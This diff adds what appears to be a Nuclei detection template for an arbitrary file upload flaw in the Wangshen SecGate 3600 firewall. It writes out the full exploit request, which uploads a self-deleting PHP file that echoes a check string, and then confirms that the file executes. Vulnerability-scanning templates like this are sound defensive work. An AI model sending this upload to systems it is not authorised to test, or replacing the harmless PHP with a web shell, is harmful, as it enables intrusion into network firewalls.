@@ -1,0 +1,48 @@
+id: wangshen-secgate3600-file-upload
+info:
+  name: Wangshen SecGate 3600 Firewall Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Wangshen SecGate 3600 firewall's obj_app_upfile interface contains an arbitrary file upload vulnerability. Attackers can exploit this to upload files and gain server permissions.
+  tags: file-upload, firewall, critical
+
+variables:
+  filename: "{{rand_text_alphanumeric(16)}}.php"
+  check_string: "{{rand_text_alphanumeric(16)}}"
+
+http:
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----nucleiboundary
+
+        ------nucleiboundary
+        Content-Disposition: form-data; name="upfile"; filename="{{filename}}"
+        Content-Type: text/plain
+
+        <?php @error_reporting(0);echo "{{check_string}}";unlink(__FILE__);?>
+        ------nucleiboundary
+        Content-Disposition: form-data; name="submit_post"
+
+        obj_app_upfile
+        ------nucleiboundary--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /attachements/{{filename}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "{{check_string}}"
+      - type: status
+        status:
+          - 200
